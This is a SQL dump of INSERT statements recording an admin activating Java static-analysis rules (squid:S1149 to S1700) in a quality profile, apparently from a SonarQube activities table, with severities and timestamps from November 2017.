INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3263, '2017-11-20 12:51:21.14', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1149;ruleKey=squid:S1149;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6m0bbGRdfPp-rQj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3264, '2017-11-20 12:51:21.167', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1150;ruleKey=squid:S1150;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6nPbbGRdfPp-rQk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3265, '2017-11-20 12:51:21.197', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1153;ruleKey=squid:S1153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6ntbbGRdfPp-rQl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3266, '2017-11-20 12:51:21.24', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1155;ruleKey=squid:S1155;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6oYbbGRdfPp-rQm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3267, '2017-11-20 12:51:21.269', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1157;ruleKey=squid:S1157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6o1bbGRdfPp-rQn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3268, '2017-11-20 12:51:21.297', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1158;ruleKey=squid:S1158;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6pRbbGRdfPp-rQo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3269, '2017-11-20 12:51:21.322', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1161;ruleKey=squid:S1161;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6pqbbGRdfPp-rQp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3270, '2017-11-20 12:51:21.35', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1163;ruleKey=squid:S1163;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6qGbbGRdfPp-rQq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3271, '2017-11-20 12:51:21.377', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1165;ruleKey=squid:S1165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6qhbbGRdfPp-rQr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3272, '2017-11-20 12:51:21.412', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1168;ruleKey=squid:S1168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6rEbbGRdfPp-rQs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3273, '2017-11-20 12:51:21.437', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1170;ruleKey=squid:S1170;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6rdbbGRdfPp-rQt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3274, '2017-11-20 12:51:21.46', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1171;ruleKey=squid:S1171;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6r0bbGRdfPp-rQu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3275, '2017-11-20 12:51:21.496', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1172;ruleKey=squid:S1172;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6sYbbGRdfPp-rQv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3276, '2017-11-20 12:51:21.518', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1174;ruleKey=squid:S1174;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6subbGRdfPp-rQw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3277, '2017-11-20 12:51:21.542', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1175;ruleKey=squid:S1175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6tGbbGRdfPp-rQx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3278, '2017-11-20 12:51:21.573', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1181;ruleKey=squid:S1181;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6tlbbGRdfPp-rQy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3279, '2017-11-20 12:51:21.592', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1182;ruleKey=squid:S1182;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6t4bbGRdfPp-rQz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3280, '2017-11-20 12:51:21.609', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1185;ruleKey=squid:S1185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6uJbbGRdfPp-rQ0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3281, '2017-11-20 12:51:21.626', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1186;ruleKey=squid:S1186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6uabbGRdfPp-rQ1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3282, '2017-11-20 12:51:21.655', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1190;ruleKey=squid:S1190;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6u3bbGRdfPp-rQ2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3283, '2017-11-20 12:51:21.689', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1191;ruleKey=squid:S1191;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6vZbbGRdfPp-rQ3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3284, '2017-11-20 12:51:21.712', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1192;ruleKey=squid:S1192;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6vwbbGRdfPp-rQ4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3285, '2017-11-20 12:51:21.727', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1193;ruleKey=squid:S1193;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6v_bbGRdfPp-rQ5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3286, '2017-11-20 12:51:21.75', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1195;ruleKey=squid:S1195;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6wWbbGRdfPp-rQ6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3287, '2017-11-20 12:51:21.773', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1197;ruleKey=squid:S1197;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6wtbbGRdfPp-rQ7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3288, '2017-11-20 12:51:21.824', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1199;ruleKey=squid:S1199;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6xgbbGRdfPp-rQ8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3289, '2017-11-20 12:51:21.842', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1201;ruleKey=squid:S1201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6xybbGRdfPp-rQ9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3290, '2017-11-20 12:51:21.891', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1206;ruleKey=squid:S1206;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6yjbbGRdfPp-rQ-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3291, '2017-11-20 12:51:21.971', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1210;ruleKey=squid:S1210;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6zzbbGRdfPp-rQ_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3292, '2017-11-20 12:51:22.128', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1214;ruleKey=squid:S1214;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze62QbbGRdfPp-rRA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3293, '2017-11-20 12:51:22.21', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1215;ruleKey=squid:S1215;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze63ibbGRdfPp-rRB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3294, '2017-11-20 12:51:22.322', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1217;ruleKey=squid:S1217;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze65SbbGRdfPp-rRC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3295, '2017-11-20 12:51:22.337', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1219;ruleKey=squid:S1219;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze65hbbGRdfPp-rRD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3296, '2017-11-20 12:51:22.372', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1220;ruleKey=squid:S1220;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze66EbbGRdfPp-rRE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3297, '2017-11-20 12:51:22.404', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1221;ruleKey=squid:S1221;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze66kbbGRdfPp-rRF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3298, '2017-11-20 12:51:22.421', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1223;ruleKey=squid:S1223;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze661bbGRdfPp-rRG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3299, '2017-11-20 12:51:22.444', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1226;ruleKey=squid:S1226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze67MbbGRdfPp-rRH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3300, '2017-11-20 12:51:22.469', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1264;ruleKey=squid:S1264;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze67lbbGRdfPp-rRI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3301, '2017-11-20 12:51:22.494', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S128;ruleKey=squid:S128;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze67-bbGRdfPp-rRJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3302, '2017-11-20 12:51:22.536', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1301;ruleKey=squid:S1301;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze68obbGRdfPp-rRK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3303, '2017-11-20 12:51:22.566', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1313;ruleKey=squid:S1313;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze69GbbGRdfPp-rRL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3304, '2017-11-20 12:51:22.598', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1317;ruleKey=squid:S1317;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze69mbbGRdfPp-rRM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3305, '2017-11-20 12:51:22.618', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1319;ruleKey=squid:S1319;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze696bbGRdfPp-rRN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3306, '2017-11-20 12:51:22.644', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S135;ruleKey=squid:S135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6-UbbGRdfPp-rRO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3307, '2017-11-20 12:51:22.675', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1444;ruleKey=squid:S1444;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6-zbbGRdfPp-rRP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3308, '2017-11-20 12:51:22.697', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1450;ruleKey=squid:S1450;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6_JbbGRdfPp-rRQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3309, '2017-11-20 12:51:22.724', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1452;ruleKey=squid:S1452;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6_kbbGRdfPp-rRR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3310, '2017-11-20 12:51:22.749', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1479;ruleKey=squid:S1479;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze6_9bbGRdfPp-rRS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3311, '2017-11-20 12:51:22.766', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1481;ruleKey=squid:S1481;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7AObbGRdfPp-rRT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3312, '2017-11-20 12:51:22.789', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1488;ruleKey=squid:S1488;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7AlbbGRdfPp-rRU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3313, '2017-11-20 12:51:22.806', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1596;ruleKey=squid:S1596;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7A2bbGRdfPp-rRV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3314, '2017-11-20 12:51:22.834', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1598;ruleKey=squid:S1598;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7BSbbGRdfPp-rRW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3315, '2017-11-20 12:51:22.864', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1602;ruleKey=squid:S1602;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7BwbbGRdfPp-rRX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3316, '2017-11-20 12:51:22.907', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1604;ruleKey=squid:S1604;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7CbbbGRdfPp-rRY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3317, '2017-11-20 12:51:22.976', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1607;ruleKey=squid:S1607;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7DgbbGRdfPp-rRZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3318, '2017-11-20 12:51:23.033', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1610;ruleKey=squid:S1610;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7EZbbGRdfPp-rRa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3319, '2017-11-20 12:51:23.055', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1611;ruleKey=squid:S1611;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7EvbbGRdfPp-rRb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3320, '2017-11-20 12:51:23.072', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1612;ruleKey=squid:S1612;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7FAbbGRdfPp-rRc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3321, '2017-11-20 12:51:23.098', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1640;ruleKey=squid:S1640;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7FabbGRdfPp-rRd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3322, '2017-11-20 12:51:23.131', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1643;ruleKey=squid:S1643;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7F7bbGRdfPp-rRe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3323, '2017-11-20 12:51:23.155', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1656;ruleKey=squid:S1656;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7GTbbGRdfPp-rRf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3324, '2017-11-20 12:51:23.19', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1659;ruleKey=squid:S1659;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7G2bbGRdfPp-rRg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3325, '2017-11-20 12:51:23.225', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1700;ruleKey=squid:S1700;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7HZbbGRdfPp-rRh');
